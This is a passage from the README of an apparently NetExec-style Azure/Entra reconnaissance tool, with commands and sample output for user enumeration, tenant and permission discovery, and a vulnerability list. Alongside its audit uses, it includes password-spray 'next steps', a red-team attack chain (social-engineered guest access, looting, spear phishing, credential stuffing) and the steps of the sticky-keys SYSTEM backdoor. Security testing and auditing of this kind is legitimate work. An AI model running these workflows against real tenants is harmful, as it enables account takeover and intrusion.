AZR         web-server-01  443     utilman.exe                        [+] CLEAN (desc:Utility Manager)
AZR         web-server-01  443     narrator.exe                       [+] CLEAN (desc:Screen Reader)
AZR         web-server-01  443     sethc.exe                          [!] BACKDOORED (desc:Windows Command Processor)
AZR         web-server-01  443     osk.exe                            [+] CLEAN (desc:Accessibility On-Screen Keyboard)
    [!!!] CRITICAL: 1 BACKDOORED executable(s) detected!

[*] LOCKSCREEN ENUMERATION SUMMARY
    Total VMs Found: 5
    Windows VMs Queried: 4
    Successful Queries: 4
    BACKDOORED: 1
    SUSPICIOUS: 0
    CLEAN: 35
```

**Use Cases**:

| Scenario | Description | Command |
|----------|-------------|---------|
| **Incident Response** | Detect persistence mechanisms | `.\azx.ps1 lockscreen-enum -VMFilter running` |
| **Security Audit** | Check all VMs for accessibility backdoors | `.\azx.ps1 lockscreen-enum -ExportPath audit.html` |
| **Compromise Assessment** | Identify potentially compromised systems | `.\azx.ps1 lockscreen-enum -ResourceGroup critical-systems` |
| **Red Team Validation** | Verify detection capabilities | Check if implanted backdoors are detected |

**Attack Context**:
1. Attacker gains access to system (e.g., via RDP, physical access, or admin credentials)
2. Copies cmd.exe to C:\Windows\System32\sethc.exe (or other accessibility executable)
3. At lock screen, presses Shift 5 times (for sethc.exe) or Win+U (for utilman.exe)
4. Instead of accessibility feature, a SYSTEM command prompt appears
5. Attacker has unauthenticated SYSTEM access

**Troubleshooting**:
- **"VM is not in running state"**: Lockscreen enumeration only works on running VMs. Use `-VMFilter running` to skip stopped VMs.
- **"AuthorizationFailed"**: Ensure you have `Virtual Machine Contributor` or `VM Command Executor` role assigned.
- **"Skipping - Lockscreen enumeration is Windows-only"**: Linux VMs don't have Windows accessibility features and are automatically skipped.
- **"NOT FOUND"**: Some executables may not exist on all Windows versions (e.g., voiceaccess.exe is Windows 11+ only).

---

### Vulnerable Target Enumeration Examples (like nxc smb --gen-relay-list)

### Example 29: Basic Vulnerability Enumeration (Auto-Detect Domain)
Enumerate vulnerable targets in your current tenant:
```powershell
.\azx.ps1 vuln-list

# Summary automatically shows risk-based color coding:
# - 🔴 HIGH RISK findings (ROPC enabled, dangerous permissions, no MFA, etc.)
# - 🟡 MEDIUM RISK findings (Security Defaults off, stale guests, etc.)
# - ⚪ LOW RISK findings (informational items)
```

### Example 30: Target Specific Tenant
Enumerate vulnerabilities for a specific domain:
```powershell
.\azx.ps1 vuln-list -Domain targetcorp.com
```

### Example 31: Export HIGH Risk Targets (Relay-List Style)
Export only HIGH risk findings in a simple format (like nxc --gen-relay-list):
```powershell
.\azx.ps1 vuln-list -ExportPath relay_targets.txt
```

### Example 32: Export Full Vulnerability Report (JSON)
Export all findings with full details:
```powershell
.\azx.ps1 vuln-list -ExportPath vuln_report.json
```

### Example 33: Export to CSV for Spreadsheet Analysis
```powershell
.\azx.ps1 vuln-list -Domain targetcorp.com -ExportPath findings.csv
```

**What vuln-list Checks:**

| Check | Phase | Risk | Description |
|-------|-------|------|-------------|
| Implicit Flow | Unauth | MEDIUM | OAuth implicit flow enabled (token theft risk) |
| ROPC Enabled | Unauth | HIGH | Password spray/brute force possible |
| Legacy Auth Endpoints | Unauth | INFO | Legacy protocols accessible |
| Password-Only SPs | Auth | HIGH | Service principals without certificate auth |
| Public Client Apps | Auth | MEDIUM | Applications allowing ROPC/device code |
| Security Defaults | Auth | MEDIUM | Security Defaults disabled |
| Legacy Auth Blocking | Auth | HIGH | No CA policy blocking legacy auth |
| Stale Guest Accounts | Auth | MEDIUM | Guests with no activity 90+ days |
| Dangerous Permissions | Auth | HIGH | Apps with high-risk API permissions |
| **Guest Permission Level** | Auth | HIGH/MEDIUM | Guests with excessive permissions (null session equivalent) |
| **Users Without MFA** | Auth | HIGH | Users without any MFA method registered |
| Guest Invite Policy | Auth | MEDIUM | Anyone (including guests) can invite external users |

### Example 28: Real-World Red Team Scenario
Complete attack chain using guest enumeration:
```powershell
# PHASE 1: External Recon (No credentials)
.\azx.ps1 tenant -Domain targetcorp.com -ExportPath recon/tenant.json
.\azx.ps1 users -Domain targetcorp.com -CommonUsernames -ExportPath recon/valid-users.csv

# Identify potential guest access opportunities from recon
# Social engineer way into getting invited as "vendor" or "consultant"

# PHASE 2: Guest Enumeration (Low-noise, minimal detection)
.\azx.ps1 hosts -ShowOwners -ExportPath loot/devices.json
.\azx.ps1 groups -ExportPath loot/groups.json
.\azx.ps1 pass-pol -ExportPath loot/policy.json
Get-MgUser -All | Export-Csv loot/all-users.csv

# Analyze results offline:
# - Identify high-value targets (executives, admins)
# - Map device ownership and relationships
# - Find non-compliant or legacy devices
# - Identify privileged accounts

# PHASE 3: Targeted Attack
# Use gathered intelligence for:
# - Spear phishing campaigns
# - Password spraying against high-value accounts
# - Credential stuffing with leaked passwords
# - Exploitation of unpatched devices
```

## 📊 Output Format

The tool provides netexec-style output with the following information:

### Username Enumeration Output

```
AZR         example.com                         443    alice@example.com                  [+] Valid username (Managed)
AZR         example.com                         443    bob@example.com                    [-] Invalid username
AZR         example.com                         443    admin@example.com                  [+] Valid username (Federated)
```

**Color Coding:**
- **Green**: Valid username found (exists in tenant)
- **Dark Gray**: Invalid username (does not exist)
- **Red**: Check failed (network/API error)

**Authentication Types:**
- **Managed**: Standard cloud-managed authentication
- **Federated**: Federated authentication (e.g., ADFS)
- **Alternate**: Alternative authentication method

**Enhanced Summary Statistics (v2.0):**
```
[*] Username enumeration complete!

[*] Summary:
    Total Checked:   250
    Valid Users:     87
    Invalid Users:   161
    Failed Checks:   2
    Duration:        00m 25s
    Rate:            10.0 checks/sec

[*] Authentication Type Breakdown:
    Managed:    45
    Federated:  38
    Alternate:  4

[*] Valid Usernames Found:
    [+] admin@example.com (Managed)
    [+] helpdesk@example.com (Managed)
    [+] support@example.com (Federated)
    ...

[*] Next Steps:
    To perform password spraying with these valid users:
    1. Extract valid users: $users = Import-Csv 'results.csv' | Where { $_.Exists -eq 'True' } | Select -ExpandProperty Username
    2. Save to file: $users | Out-File spray-targets.txt
    3. Run spray: .\azx.ps1 guest -Domain example.com -UserFile spray-targets.txt -Password 'YourPassword123!'
```

**Features:**
- Total usernames checked
- Valid/invalid breakdown with failed checks tracked separately
- Duration and enumeration rate (users/sec)
- Authentication type breakdown (Managed/Federated/Alternate)
- List of all valid usernames with their auth types
- Automatic next steps guidance for password spraying workflow

### User Profile Enumeration Output

```
AZR         a1b2c3d4e5f6    443    John Smith                             [*] (upn:john.smith@example.com) (job:Senior Engineer) (dept:IT) (type:Member) (status:Enabled) (location:Seattle) (lastSignIn:2025-12-10)
AZR         f6e5d4c3b2a1    443    Jane Doe                               [*] (upn:jane.doe@example.com) (job:Marketing Manager) (dept:Marketing) (type:Member) (status:Enabled) (location:New York) (lastSignIn:2025-12-12)
AZR         1234567890ab    443    External Vendor                        [*] (upn:vendor@partner.com#EXT#@examp...) (job:N/A) (dept:N/A) (type:Guest) (status:Enabled) (location:N/A) (lastSignIn:2025-11-20)
AZR         abcdef123456    443    Test Account                           [*] (upn:test@example.com) (job:N/A) (dept:N/A) (type:Member) (status:Disabled) (location:N/A) (lastSignIn:Never/Unknown)
```

**Color Coding:**
- **Green**: Active member users (enabled accounts)
- **Yellow**: Guest users (external/B2B users)
- **Dark Gray**: Disabled accounts

**User Information Displayed:**
- **UPN**: User Principal Name (email/login)
- **Job**: Job title
- **Dept**: Department
- **Type**: Member (internal) or Guest (external/B2B)
- **Status**: Enabled or Disabled
- **Location**: Office location
- **LastSignIn**: Last sign-in date (requires AuditLog.Read.All permission)

**Summary Statistics:**
- Total users found
- Member users count
- Guest users count
- Enabled accounts count
- Disabled accounts count

### Tenant Discovery Output

```
AZR         example.com                         443    [*] Tenant Discovery

    [+] Tenant ID:                xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
    [+] Issuer:                   https://login.microsoftonline.com/{tenant-id}/v2.0
    [+] Authorization Endpoint:   https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/authorize
    [+] Token Endpoint:           https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/token
    [+] UserInfo Endpoint:        https://graph.microsoft.com/oidc/userinfo
    [+] End Session Endpoint:     https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/logout
    [+] JWKS URI:                 https://login.microsoftonline.com/{tenant-id}/discovery/v2.0/keys
    [+] Tenant Region Scope:      NA
    [+] Cloud Instance:           microsoftonline.com
    [+] Graph Host:               graph.microsoft.com
    [+] Federation Status:        Managed

    [*] Supported Response Types: code, id_token, token, id_token token
    [*] Supported Scopes:         openid, profile, email, offline_access
    [*] Supported Claims:         45 claims available

[*] Enumerating exposed applications and configurations...
    [!] Implicit flow enabled (security consideration)

    [*] Supported Grant Types:
        - authorization_code
        - refresh_token
        - client_credentials
          [!] Note: client_credentials grant type enabled

[*] Probing for exposed application information...
    [+] Accessible endpoint: https://graph.microsoft.com/.well-known/openid-configuration

[*] Security Findings:
    [!] Potential Misconfigurations: 1
        - Implicit flow enabled (potential security risk)
```

**Information Retrieved:**
- **Basic Configuration**:
  - Tenant ID (GUID)
  - Authentication and authorization endpoints
  - Token endpoints
  - JWKS URI for token validation
  - Tenant region and cloud instance
  - Federation status (Managed vs Federated)
  - Supported response types, scopes, and claims

- **Security Enumeration** (mimics `nxc smb --enum`):
  - Exposed application IDs and client configurations
  - Publicly accessible redirect URIs
  - OAuth/OIDC misconfigurations and security risks
  - Enabled grant types and their security implications
  - Accessible federation metadata
  - Implicit flow detection (potential XSS/token leakage risks)
  - Risky grant types (password grants, client credentials)

**Color Coding:**
- **Green**: Secure configurations or successfully retrieved information
- **Yellow**: Security considerations, warnings, or potential misconfigurations
- **Cyan**: Standard information and metadata
- **Dark Gray**: Additional technical details

### Device Enumeration Output

```
AZR         <DeviceID>       443    <DeviceName>                          [*] <OS> <Version> (name:<FullName>) (trust:<Type>) (compliant:<True/False>) (enabled:<True/False>) (owner:<Owner>)
```

**Color Coding:**
- **Cyan**: Normal, enabled, compliant devices
- **Yellow**: Non-compliant devices
- **Dark Gray**: Disabled devices

**Summary Statistics:**
- Total devices found
- Windows devices count
- Azure AD joined devices count
- Hybrid joined devices count
- Compliant devices count
- Enabled devices count

### Group Enumeration Output (mimics `nxc smb --groups`)

```
AZR         <GroupID>        443    <GroupName>                           [*] (name:<FullName>) (type:<GroupTypes>) (security:<True/False>) (mail:<True/False>) (members:<Count>) (desc:<Description>)
```

**Example:**
```
AZR         a1b2c3d4e5f6    443    IT Administrators                      [*] (name:IT Administrators) (type:Security) (security:True) (mail:False) (members:15) (desc:IT department admins)
AZR         f6e5d4c3b2a1    443    Marketing Team                         [*] (name:Marketing Team) (type:Unified) (security:False) (mail:True) (members:42) (desc:Marketing department)
```

**Color Coding:**
- **Green**: Security groups (SecurityEnabled = True)
- **Yellow**: Mail-enabled groups
- **Cyan**: Other group types

**Group Types:**
- **Security**: Security groups (used for access control)
- **Unified**: Microsoft 365 groups
- **DynamicMembership**: Dynamic groups with automatic membership

### Application Enumeration Output

```
AZR         <AppID>          443    <ApplicationName>                     [*] (name:<FullName>) (type:<App/SPN>) (creds:<Type> [Count]) (audience:<Audience>) (publicClient:<True/False>)
```

**Example:**
```
AZR         a1b2c3d4e5f6    443    Corporate Web App                      [*] (name:Corporate Web App) (type:App) (creds:Certificate [2]) (audience:AzureADMyOrg) (publicClient:False)
AZR         f6e5d4c3b2a1    443    Legacy API Service                     [*] (name:Legacy API Service) (type:SPN) (creds:Password [1]) (audience:AzureADMultipleOrgs) (publicClient:False)
AZR         1234567890ab    443    Mobile App                             [*] (name:Mobile App) (type:App) (creds:None [0]) (audience:AzureADandPersonalMicrosoftAccount) (publicClient:True)
```

**Color Coding:**
- **Green**: Certificate-based authentication (secure)
- **Yellow**: Password-only credentials (vulnerable) OR public client enabled (ROPC-enabled)

### Service Principal Discovery Output

```
AZR         <SPNID>          443    <ServicePrincipalName>                [*] (appId:<AppID>) (type:<Type>) (status:<Enabled/Disabled>) (pwdCreds:<Count>) (certCreds:<Count>) (appRoles:<Count>) (delegated:<Count>) (owners:<Count>)
    [+] Application Permissions (App Roles):
        [-] <ResourceName> : <PermissionName> (ID: <RoleID>)
    [+] Delegated Permissions (OAuth2):
        [-] <ResourceName> : <Scope> (ConsentType: <Type>)
    [+] Owners:
        [-] <OwnerName> [<OwnerType>] (<UPN if user>)
```

**Example:**
```
AZR         a1b2c3d4e5f6    443    Corporate Automation SPN               [*] (appId:12345678-1234-1234-1234-123456789012) (type:Application) (status:Enabled) (pwdCreds:1) (certCreds:0) (appRoles:3) (delegated:2) (owners:1)
    [+] Application Permissions (App Roles):
        [-] Microsoft Graph : User.Read.All (ID: df021288-bdef-4463-88db-98f22de89214)
        [-] Microsoft Graph : Directory.Read.All (ID: 7ab1d382-f21e-4acd-a863-ba3e13f7da61)
        [-] Microsoft Graph : Group.Read.All (ID: 5b567255-7703-4780-807c-7be8301ae99b)
    [+] Delegated Permissions (OAuth2):
        [-] Microsoft Graph : User.Read Group.Read.All (ConsentType: AllPrincipals)
        [-] Office 365 SharePoint Online : AllSites.Read (ConsentType: AllPrincipals)
    [+] Owners:
        [-] John Doe [user] (john.doe@example.com)

AZR         f6e5d4c3b2a1    443    Legacy Service Principal               [*] (appId:98765432-4321-4321-4321-210987654321) (type:Application) (status:Enabled) (pwdCreds:1) (certCreds:1) (appRoles:0) (delegated:0) (owners:0)

AZR         1234567890ab    443    High-Risk Admin SPN                    [*] (appId:abcdef12-3456-7890-abcd-ef1234567890) (type:Application) (status:Enabled) (pwdCreds:1) (certCreds:0) (appRoles:5) (delegated:3) (owners:2)
    [+] Application Permissions (App Roles):
        [-] Microsoft Graph : RoleManagement.ReadWrite.Directory (ID: 9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8)
        [-] Microsoft Graph : Application.ReadWrite.All (ID: 1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9)
        [-] Microsoft Graph : Directory.ReadWrite.All (ID: 19dbc75e-c2e2-444c-a770-ec69d8559fc7)
```

**Color Coding:**
- **Green**: Service principals with permissions and proper certificate-based authentication
- **Yellow**: Password-only credentials (security risk)
- **DarkGray**: Disabled service principals
- **Cyan**: Default for other service principals

**Security Indicators:**
- **Password-only credentials** (pwdCreds > 0, certCreds = 0): Vulnerable to credential theft
- **High-risk permissions**: RoleManagement.ReadWrite, Application.ReadWrite, Directory.ReadWrite
- **No owners** (owners = 0): Orphaned service principals that may be abandoned
- **Many permissions** (appRoles or delegated > 5): Potential over-privileged service principals
- **Cyan**: Normal applications with mixed or secure configuration
- **Dark Gray**: Applications with no credentials

**Credential Types:**
- **Certificate**: Uses certificate-based authentication (recommended, most secure)
- **Password**: Uses password/secret-based authentication (weaker security)
- **Both**: Has both password and certificate credentials
- **None**: No credentials configured (may use managed identity or delegated permissions)

**Application Types:**
- **App**: Application registration
- **SPN**: Service Principal

**Security Indicators:**
- `publicClient:True` = ROPC flow enabled, vulnerable to password spray attacks
- `creds:Password` = Password-only authentication, vulnerable to credential theft
- Applications with `Password` credentials and no certificates are flagged as HIGH risk

**Summary Statistics Displayed:**
- Total registered applications
- Apps with password credentials
- Apps with certificate credentials
- Public client apps (ROPC-enabled)
- Total service principals
- SPNs with password/certificate credentials
- Enabled service principals
- Managed identities count
- Security warnings for password-only configurations
- **Distribution**: Distribution lists (mail-enabled)

**Summary Statistics:**
- Total groups found
- Security groups count
- Mail-enabled groups count
- Microsoft 365 groups count
- Dynamic groups count

### Password Policy Output (mimics `nxc smb --pass-pol`)

```
AZR         <TenantName>                         443    [*] Password Policy Information

    [*] Azure AD Default Password Requirements (Always Enforced):
        Minimum Length:            8 characters
        Maximum Length:            256 characters
        Complexity:                3 of 4 character types (upper, lower, numbers, symbols)
        Banned Passwords:          Global banned password list (enforced)
        Common Password Check:     Fuzzy matching enabled
        Contextual Check:          Username/display name check enabled

    [+] Password Validity Period:     90 days
    [+] Password Notification Window: 14 days
    [+] Verified Domains:             2 domain(s)
        - contoso.com (Default)
        - contoso.onmicrosoft.com (Initial)
    [+] Technical Notification Emails: 1
        - admin@example.com

[*] Retrieving Smart Lockout Settings (Account Protection)...
[+] Smart Lockout Configuration:
    [*] Lockout Threshold:            10 failed attempts (Azure AD default)
    [*] Lockout Duration:             60 seconds initial, increases with repeated attempts
    [*] Lockout Counter Reset:        After successful sign-in
    [*] Account Lockout Detection:    Automated based on sign-in patterns
    [*] Familiar Location Detection:  Enabled (sign-ins from familiar IPs are less restricted)

    [*] MFA Registration Campaign:
        State: enabled
        Snooze Duration: 14 days

    [*] Enabled Authentication Methods:
        [+] Microsoft Authenticator (Enabled)
        [+] SMS (Enabled)
        [+] FIDO2 Security Key (Enabled)

[+] Security Defaults: ENABLED
    [*] This enforces MFA for administrators and users when needed
    [*] Blocks legacy authentication protocols
    [*] Protects privileged activities (Azure portal, PowerShell, etc.)

[+] Found 5 Conditional Access Policies

    [ENABLED] Require MFA for Admins
        [+] Requires MFA
        Scope: All Applications
    [ENABLED] Block Legacy Authentication
        Scope: All Applications
    [REPORT-ONLY] Require Compliant Device
        Scope: All Applications

    [*] CA Policy Summary:
        Enabled: 3
        Report-Only: 1
        Disabled: 1

[*] ========================================
[*] Password Policy Summary (NetExec Style)
[*] ========================================
[+] Minimum Password Length:     8 characters (Azure AD enforced)
[+] Password Complexity:         3 of 4 character types required
[+] Password History:            N/A (Azure AD cloud-only)
[+] Lockout Threshold:           10 failed attempts (Smart Lockout)
[+] Lockout Duration:            60 seconds (increases with repeated attempts)
[+] Lockout Observation Window:  Dynamic based on sign-in patterns
[+] Maximum Password Age:        90 days
[+] Minimum Password Age:        N/A (Azure AD cloud-only)
[+] Banned Password List:        Enabled (Global + Custom if configured)
[+] Smart Lockout:               Enabled (Azure AD default)
[+] Security Defaults:           Enabled (MFA enforced)
[+] Conditional Access:          5 policies configured
```

**Color Coding:**
- **Green**: Good security posture (Security Defaults enabled, policies enforced, MFA required)
- **Yellow**: Security considerations (Security Defaults disabled, report-only policies)
- **Cyan**: Informational (policy details, settings)
- **Dark Gray**: Technical details (authentication methods, domains)

**Information Retrieved (Enhanced - NetExec Style):**
- **Default Password Requirements**: Minimum/maximum length, complexity, banned passwords (always enforced by Azure AD)
- **Smart Lockout Settings**: Lockout threshold (10 attempts), duration (60s+), familiar location detection
- **Password Policies**: Expiration periods, notification windows
- **Domain Configuration**: Verified domains, default domains
- **Authentication Methods**: Enabled MFA methods (Authenticator, SMS, FIDO2, etc.)
- **Security Defaults**: Whether baseline security is enabled (MFA, legacy auth blocking)
- **Conditional Access Policies**: Policies enforcing MFA, device compliance, location restrictions
- **Technical Contacts**: Admin and security notification emails
- **NetExec-Style Summary**: Formatted output similar to `nxc smb --pass-pol` with all key password policy settings

**Azure AD vs On-Premises Password Policy Comparison:**

| Policy Setting | On-Premises AD (NetExec) | Azure AD (AZexec) |
|----------------|--------------------------|-------------------|
| **Minimum Password Length** | Configurable (default: 7) | **8 characters (enforced)** |
| **Password Complexity** | Configurable (default: enabled) | **3 of 4 character types (enforced)** |
| **Password History** | Configurable (default: 24) | N/A (cloud-only, no history tracking) |
| **Lockout Threshold** | Configurable (default: varies) | **10 failed attempts (Smart Lockout)** |
| **Lockout Duration** | Configurable (default: 30 min) | **60 seconds (increases with repeated attempts)** |
| **Lockout Observation Window** | Configurable (default: 30 min) | **Dynamic (based on sign-in patterns)** |
| **Maximum Password Age** | Configurable (default: 42 days) | Configurable (default: no expiration) |
| **Minimum Password Age** | Configurable (default: 1 day) | N/A (cloud-only) |
| **Banned Passwords** | Not available | **Global banned list + custom words (enforced)** |
| **Common Password Check** | Not available | **Fuzzy matching (enforced)** |
| **Contextual Check** | Not available | **Username/display name check (enforced)** |
| **Familiar Location Detection** | Not available | **Enabled (less restrictive for known IPs)** |

**Key Differences:**
- Azure AD enforces stronger baseline password requirements (min 8 chars, complexity, banned passwords)
- Azure AD Smart Lockout is more intelligent (familiar location detection, dynamic observation window)
- Azure AD doesn't support password history (cloud-only limitation)
- Azure AD's lockout duration increases with repeated attempts (adaptive security)
- Azure AD banned password list protects against common weak passwords globally

### Guest Login Enumeration Output (mimics `nxc smb -u 'a' -p ''`)

```
[*] AZX - Azure/Entra Guest Login Enumeration
[*] Command: Guest Enumeration (Similar to: nxc smb -u 'a' -p '')
[*] Target Domain: targetcorp.com
[*] Method: ROPC Authentication Testing

[*] Phase 1: Checking tenant guest configuration (unauthenticated)...
AZR         targetcorp.com                      443    [+] Tenant exists
AZR         targetcorp.com                      443    [*] NameSpaceType: Managed
AZR         targetcorp.com                      443    [*] Federation: Managed (Cloud-only)
AZR         targetcorp.com                      443    [+] External/Guest users: Likely ENABLED (B2B)

[*] Phase 2: Testing guest authentication...
AZR         targetcorp.com                      443    alice@targetcorp.com                   [+] Valid credentials - MFA REQUIRED
AZR         targetcorp.com                      443    bob@targetcorp.com                     [-] Invalid credentials
AZR         targetcorp.com                      443    admin@targetcorp.com                   [!] ACCOUNT LOCKED
AZR         targetcorp.com                      443    test@targetcorp.com                    [!] PASSWORD EXPIRED (valid user)
AZR         targetcorp.com                      443    service@targetcorp.com                 [+] SUCCESS! Got access token (password)

[*] Authentication Test Summary:
    Total Tested:    5
    Valid Creds:     3
    MFA Required:    1
    Accounts Locked: 1
```

**Color Coding:**
- **Green**: Valid credentials (with or without MFA requirement)
- **Yellow**: Valid user but blocked (MFA required, password expired, account locked)
- **Dark Gray**: Invalid credentials or user not found
- **Red**: Check failed (network/API error)

**Authentication Result Codes:**
- `[+] SUCCESS! Got access token` - Valid credentials, authentication successful
- `[+] Valid credentials - MFA REQUIRED` - Credentials are valid but MFA is required (good for password spray)
- `[+] Valid credentials - CONSENT REQUIRED` - Credentials valid, app consent needed
- `[!] ACCOUNT LOCKED` - Too many failed attempts, account is locked
- `[!] PASSWORD EXPIRED (valid user)` - Password expired but user exists
- `[-] Invalid credentials` - Wrong username or password
- `[-] User not found` - Username does not exist in tenant
- `[-] Account disabled` - Account exists but is disabled
- `[!] ROPC disabled` - ROPC flow is disabled (try device code flow)

**Phase 1 Information (Unauthenticated):**
- **Tenant Exists**: Whether the domain is a valid Azure tenant
- **NameSpaceType**: Managed (cloud-only) or Federated (on-premises)
- **Federation Status**: Authentication method (cloud, ADFS, etc.)
- **B2B Status**: Whether external/guest users are likely accepted

**Phase 2 Information (Authentication Testing):**
- Per-user authentication test results
- MFA detection (valid creds even if MFA blocks)
- Account lockout detection
- Password expiration detection

### Active Session Enumeration Output (mimics `nxc smb --qwinsta`)

```
[*] AZX - Azure/Entra Active Session Enumeration
[*] Command: Sessions (Similar to: nxc smb --qwinsta)
[*] Querying sign-in logs for last 24 hours...

[+] Authenticated as: admin@targetcorp.com

[*] ========================================
[*] ACTIVE SIGN-IN SESSIONS
[*] ========================================

[*] Querying Azure AD sign-in logs (this may take a moment)...
[+] Found 47 sign-in events

AZR          alice@targetcorp.com                      203.0.113.45   [+] SUCCESS
    Time:      2024-12-14 08:23:15
    Device:    ALICE-LAPTOP (Windows 11)
    App:       Microsoft Teams
    Location:  Seattle, United States
    MFA:       Required

AZR          bob@targetcorp.com                        198.51.100.12  [+] SUCCESS
    Time:      2024-12-14 08:15:42
    Device:    BOB-DESKTOP (Windows 10)
    App:       Office 365 Exchange Online
    Location:  New York, United States

AZR          charlie@targetcorp.com                    192.0.2.100    [!] FAILED
    Time:      2024-12-14 07:58:30
    Device:    Unknown Device (Linux)
    App:       Azure Portal
    Location:  Moscow, Russia
    Risk:      HIGH
    Error:     Invalid username or password

AZR          alice@targetcorp.com                      203.0.113.45   [+] SUCCESS
    Time:      2024-12-14 07:45:12
    Device:    ALICE-LAPTOP (Windows 11)
    App:       SharePoint Online
    Location:  Seattle, United States
    MFA:       Required

[*] ========================================
[*] SESSION SUMMARY
[*] ========================================

AZR          Total Sign-ins:      47
AZR          Unique Users:        15
AZR          Successful:          42
AZR          Failed:              5
AZR          MFA Protected:       38
AZR          Risky Sign-ins:      2

[*] Top Active Users:
    alice@targetcorp.com: 8 sign-ins
    bob@targetcorp.com: 6 sign-ins
    carol@targetcorp.com: 4 sign-ins
    dave@targetcorp.com: 3 sign-ins
    eve@targetcorp.com: 3 sign-ins

[*] Top Applications:
    Microsoft Teams: 12 sign-ins
    Office 365 Exchange Online: 10 sign-ins
    SharePoint Online: 8 sign-ins
    Azure Portal: 5 sign-ins
    Microsoft Graph: 4 sign-ins

[*] Session enumeration complete!
```

**Key Information Displayed:**
- **Timestamp**: Local time when sign-in occurred
- **User**: UserPrincipalName (email/username)
- **Status**: SUCCESS (green) or FAILED (red)
- **IP Address**: Source IP of the connection
- **Device**: Device name and operating system
- **Application**: Which app/service was accessed
- **Location**: Geographic location (city, country)
- **MFA Status**: Whether MFA was required
- **Risk Level**: HIGH/MEDIUM/LOW (if Identity Protection detects risk)
- **Error Details**: Failure reason for unsuccessful sign-ins

**Summary Statistics:**
- Total sign-in events found
- Number of unique users
- Success vs failure counts
- MFA-protected session count
- Risky sign-in count
- Top 5 most active users
- Top 5 most accessed applications

### Vulnerable Target Enumeration Output (mimics `nxc smb --gen-relay-list`)

```
[*] AZX - Vulnerable Target Enumeration
[*] Command: Vuln-List (Azure Relay Target Equivalent)
[*] Similar to: nxc smb 192.168.1.0/24 --gen-relay-list

[*] PHASE 1: Unauthenticated Enumeration
[*] ========================================

[+] Using auto-detected domain: targetcorp.com

[*] Checking tenant configuration for: targetcorp.com
    [+] Tenant ID: 12345678-1234-1234-1234-123456789abc
    [!] IMPLICIT FLOW ENABLED - Token theft risk

[*] Testing guest/external authentication...
    [!] ROPC ENABLED - Password spray/brute force possible

[*] Checking legacy authentication endpoints...
    [*] Exchange ActiveSync endpoint accessible
    [*] Autodiscover endpoint accessible (requires auth)

[*] PHASE 2: Authenticated Enumeration
[*] ========================================

[+] Using existing Graph connection: user@targetcorp.com

[*] Enumerating Service Principals with password credentials...
    (Like SMB hosts without signing - weaker authentication)
    [!] Legacy App Service
        AppId: aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee
    [!] API Integration [EXPIRING SOON]
        AppId: 11111111-2222-3333-4444-555555555555

    [*] Total password-only service principals: 12

[*] Enumerating applications with public client flows enabled...
    (Allows ROPC - direct username/password authentication)
    [!] Mobile App [MEDIUM]
        AppId: 99999999-8888-7777-6666-555555555555 | Audience: AzureADMultipleOrgs
    [!] Desktop Client [HIGH]
        AppId: 00000000-1111-2222-3333-444444444444 | Audience: AzureADMyOrg

    [*] Total public client applications: 5

[*] Checking Security Defaults and Conditional Access...
    [!] SECURITY DEFAULTS DISABLED
        Check if Conditional Access provides equivalent protection
    [!] LEGACY AUTH NOT BLOCKED - MFA bypass possible
    [*] Found 8 Conditional Access policies

[*] Enumerating guest users...
    (External users = potential 'null session' equivalent)
    [*] Total guest users: 47
    [*] Active guests (90 days): 23
    [!] Stale guests (no activity 90+ days): 24

[*] Checking for applications with dangerous API permissions...
    [!] Third-Party Sync App
        Permissions: Mail.ReadWrite, Mail.Send
    [!] Backup Solution
        Permissions: Files.ReadWrite.All, Sites.ReadWrite.All

    [*] Total apps with dangerous permissions: 3

[*] Checking guest user permission level...
    (Determines what guests can enumerate - the 'null session' equivalent)
    [!] CRITICAL: Guest access = SAME AS MEMBER USERS
        Guests can enumerate entire directory (null session equivalent)
    [!] Guest invites: ANYONE can invite (including guests)

[*] Checking for users without MFA methods registered...
    (Users vulnerable to credential stuffing/phishing)
    [!] Users WITHOUT MFA: 23
        - John Smith
        - Jane Doe [ADMIN]
        - Bob Wilson
        - Alice Johnson
        - Test Account
        ... and 18 more
    [!] CRITICAL: 2 ADMIN(S) without MFA!
    [*] Total checked: 150 | With MFA: 127 | Without: 23

[*] ========================================
[*] VULNERABILITY SUMMARY
[*] ========================================

AZR         targetcorp.com                      443    [*] Vuln-List Results

    [!] HIGH RISK findings:   12
    [!] MEDIUM RISK findings: 10
    [*] Total findings:       22

[+] Full results exported to: vuln_report.json

[*] RECOMMENDATIONS:
    [!] Address HIGH risk findings immediately:
        - Replace password credentials with certificates for service principals
        - Block legacy authentication via Conditional Access
        - Review and minimize dangerous API permissions
        - Restrict guest user permissions to "Most restricted"
        - Enforce MFA registration for all users (especially admins!)
    [*] Review MEDIUM risk findings:
        - Audit public client applications
        - Clean up stale guest accounts
        - Enable Security Defaults or equivalent CA policies
        - Restrict guest invite permissions

[*] Vuln-list enumeration complete!
```

**Color Coding:**
- **Red**: HIGH risk findings (immediate action required)
- **Yellow**: MEDIUM risk findings (should be reviewed)
- **Green**: Passed checks or good security posture
- **Dark Gray**: Informational findings

**Phase 1 (Unauthenticated) Checks:**
- Tenant configuration (implicit flow, ROPC status)
- Legacy authentication endpoint accessibility
- Guest/external authentication acceptance

**Phase 2 (Authenticated) Checks:**
- Service principals with password-only credentials (no certificate auth)
- Applications with public client flows (ROPC vulnerable)
- Security Defaults and Conditional Access gaps
- Legacy authentication blocking policies
- Guest user enumeration and stale accounts
- Dangerous OAuth permission grants
- **Guest permission level** (null session vulnerability)
- **Users without MFA registered** (credential attack targets)
- Guest invite policy configuration

**Export Formats:**
- `.txt` - Simple relay-list style (HIGH risk only): `Type,Target,Vulnerability`
- `.json` - Full findings with all metadata
- `.csv` - Spreadsheet-friendly format

## 🔍 Interpreting Security Findings

### Tenant Discovery Security Assessment

When running `.\azx.ps1 tenant`, the tool performs security-focused enumeration similar to `nxc smb --enum` and may identify the following:

#### Exposed Application IDs
- **What**: Publicly accessible application/client IDs in the tenant configuration
- **Risk**: These IDs can be used to craft targeted phishing attacks or test for misconfigured application permissions
- **Severity**: Low to Medium (depends on application configuration)

#### Exposed Redirect URIs
- **What**: OAuth redirect URIs that are publicly visible
- **Risk**: Can reveal internal application URLs, development endpoints, or misconfigured redirect targets
